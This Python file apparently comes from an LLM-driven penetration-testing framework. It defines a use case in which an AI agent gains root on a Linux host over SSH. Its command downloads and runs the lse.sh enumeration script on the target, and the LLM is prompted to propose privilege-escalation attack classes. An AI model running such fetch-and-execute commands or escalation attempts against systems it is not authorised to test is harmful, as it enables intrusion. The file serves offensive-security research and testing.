from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand
from hackingBuddyGPT.usecases.base import UseCase, use_case
from hackingBuddyGPT.utils.connectors.ssh_connection import SSHConnection
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection

from .linux_privesc import PrivEscLinux

template_lse = Template("""
Create a list of up to ${number} attack classes that you would try on a linux system
(to achieve root level privileges) given the following output:

~~~ bash
${lse_output}
~~~

only output the list of attack classes, for each attack class only output a single
short sentence.""")

@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
class ExPrivEscLinuxLSEUseCase(UseCase):
    conn: SSHConnection = None
    max_turns: int = 20
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    llm: OpenAIConnection = None

    _got_root: bool = False

    # simple helper that uses lse.sh to get hints from the system
    def call_lse_against_host(self):
        self.log.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)

        self.log.console.print("[yellow]got the output: " + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.log.console.print("[yellow]got the cmd: " + cmd.result)

        return [x for x in cmd.result.splitlines() if x.strip()]

    def get_name(self) -> str:
        return self.__class__.__name__

    def run(self, configuration={}):
        # get the hints through running LSE on the target system
        hints = self.call_lse_against_host()
        turns_per_hint = int(self.max_turns / len(hints))

        # now try to escalate privileges using the hints
        for hint in hints:
            self.log.console.print("[yellow]Calling a use-case to perform the privilege escalation")
            result = self.run_using_usecases(hint, turns_per_hint)

            if result is True:
                self.log.console.print("[green]Got root!")
                return True

    def run_using_usecases(self, hint, turns_per_hint):
        # init usecase
        linux_privesc = PrivEscLinux(
            conn=self.conn,
            enable_explanation=self.enable_explanation,
            enable_update_state=self.enable_update_state,
            disable_history=self.disable_history,
            llm=self.llm,
            hints=f"hint:{hint}",
            max_turns=turns_per_hint,
            log=self.log,
        )

        linux_privesc.init()
        return linux_privesc.run({})